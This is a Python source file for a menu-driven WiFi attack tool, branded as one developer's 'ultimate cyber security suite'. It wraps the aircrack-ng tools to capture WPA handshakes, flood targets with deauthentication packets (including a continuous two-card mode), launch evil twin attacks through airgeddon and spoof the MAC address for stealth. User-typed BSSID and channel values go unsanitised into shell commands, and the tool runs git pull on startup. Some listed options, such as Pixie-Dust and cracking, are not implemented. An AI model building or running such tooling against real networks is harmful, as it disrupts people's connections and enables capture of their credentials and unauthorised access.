import os
import time
import sys
import subprocess

G, C, W, R, Y = '\033[92m', '\033[96m', '\033[0m', '\033[91m', '\033[93m'

def clear():
    os.system('clear')

def abdul_mateen_banner():
    clear()
    print(f"""{C}
    ###########################################################################
    #                                                                         #
    #      █████╗ ██████╗ ██████╗ ██╗   ██╗██╗         ███╗   ███╗███╗   ██╗    #
    #     ██╔══██╗██╔══██╗██╔══██╗██║   ██║██║         ████╗ ████║████╗  ██║    #
    #     ███████║██████╔╝██║  ██║██║   ██║██║         ██╔████╔██║██╔██╗ ██║    #
    #     ██╔══██║██╔══██╗██║  ██║██║   ██║██║         ██║╚██╔╝██║██║╚██╗██║    #
    #     ██║  ██║██████╔╝██████╔╝╚██████╔╝███████╗    ██║ ╚═╝ ██║██║ ╚████║    #
    #     ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═══╝    #
    #                                                                         #
    #   {G}---  THE MOST BEAUTIFUL BOY'S ULTIMATE CYBER SECURITY SUITE  ---{C}    #
    #   {W}---      ALL-IN-ONE ELITE EDITION | DEVELOPER: ABDUL MATEEN      ---{C}    #
    #                                                                         #
    ###########################################################################{W}
    """)

def check_root():
    if os.getuid() != 0:
        print(f"{R}[!] ERROR: Run with 'sudo'!{W}")
        sys.exit(1)

def get_interfaces():
    try:
        output = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True).decode()
        return output.split()
    except:
        return []

def auto_clean_logs():
    print(f"{Y}[*] Cleaning system junk...{W}")
    temp_exts = ['.log', '.csv', '.kismet.csv', '.kismet.netxml', '.cap']
    count = 0
    for file in os.listdir('.'):
        if any(file.endswith(ext) for ext in temp_exts):
            try:
                os.remove(file)
                count += 1
            except: pass
    print(f"{G}[+] {count} Files deleted.{W}")

def capture_handshake(iface):
    save_dir = os.path.expanduser("~/Desktop/Abdul_Mateen_Handshakes")
    if not os.path.exists(save_dir): os.makedirs(save_dir)
    
    print(f"{G}[+] Saving to: {save_dir}{W}")
    bssid = input(f"{Y}Target BSSID: {W}")
    ch = input(f"{Y}Channel: {W}")
    fname = input(f"{Y}File Name: {W}")
    full_path = os.path.join(save_dir, fname)
    
    subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "-c", ch, "-w", full_path, iface])

def dual_card_attack(cards):
    if len(cards) < 2:
        print(f"{R}[!] 2 Cards Required!{W}")
        return
    
    bssid = input(f"{Y}Target BSSID: {W}")
    ch = input(f"{Y}Channel: {W}")
    
    subprocess.run(["sudo", "airmon-ng", "start", cards[0], ch])
    subprocess.run(["sudo", "airmon-ng", "start", cards[1], ch])
    
    c1, c2 = f"{cards[0]}mon", f"{cards[1]}mon"
    os.system(f"xterm -T 'SCANNER' -e 'sudo airodump-ng --bssid {bssid} -c {ch} {c1}' &")
    os.system(f"xterm -T 'ATTACKER' -e 'sudo aireplay-ng --deauth 0 -a {bssid} {c2}' &")

def evil_twin_mode():
    if os.path.exists("/usr/bin/airgeddon"):
        subprocess.run(["sudo", "airgeddon"])
    else:
        print(f"{R}[!] Airgeddon missing!{W}")

def main_menu():
    subprocess.run(["git", "pull"], capture_output=True)
    
    while True:
        cards = get_interfaces()
        active_iface = cards[0] if cards else "None"
        mon_iface = active_iface if 'mon' in active_iface else active_iface + 'mon'
        
        abdul_mateen_banner()
        print(f"{Y}[ STATUS ] | {G}Cards: {C}{len(cards)} {W}| {G}Primary: {C}{active_iface}{W}")
        print(f"{C}{'-'*75}{W}")
        print(f"{G}01.{W} Enable Monitor Mode      {G}06.{R} EVIL TWIN ATTACK{W}")
        print(f"{G}02.{W} Live Network Scan       {G}07.{W} WPS Pixie-Dust{W}")
        print(f"{G}03.{W} Capture Handshake       {G}08.{W} Stealth (MAC Changer){W}")
        print(f"{G}04.{W} Deauth Attack           {G}09.{W} Crack Handshake{W}")
        print(f"{G}05.{C} DUAL-CARD ATTACK{W}        {G}10.{Y} Maintenance{W}")
        print(f"{R}00.{W} Shutdown Framework")
        print(f"{C}{'-'*75}{W}")

        choice = input(f"\n{C}[{G}MATEEN-PRO{C}] > {W}")

        if choice in ['1', '01']: subprocess.run(["sudo", "airmon-ng", "start", active_iface])
        elif choice in ['2', '02']: subprocess.run(["sudo", "airodump-ng", "--manufacturer", mon_iface])
        elif choice in ['3', '03']: capture_handshake(mon_iface)
        elif choice in ['4', '04']:
            bssid = input("Target BSSID: ")
            subprocess.run(["sudo", "aireplay-ng", "--deauth", "50", "-a", bssid, mon_iface])
        elif choice in ['5', '05']: dual_card_attack(cards)
        elif choice in ['6', '06']: evil_twin_mode()
        elif choice in ['8', '08']:
            os.system(f"sudo ifconfig {active_iface} down && macchanger -r {active_iface} && ifconfig {active_iface} up")
        elif choice == '10':
            auto_clean_logs()
            subprocess.run(["git", "pull"])
        elif choice in ['0', '00']:
            print(f"{G}Allah Hafiz!{W}")
            break
        
        input(f"\n{Y}Press [ENTER] to return...{W}")

if __name__ == "__main__":
    try:
        check_root()
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Exiting...{W}")
        sys.exit()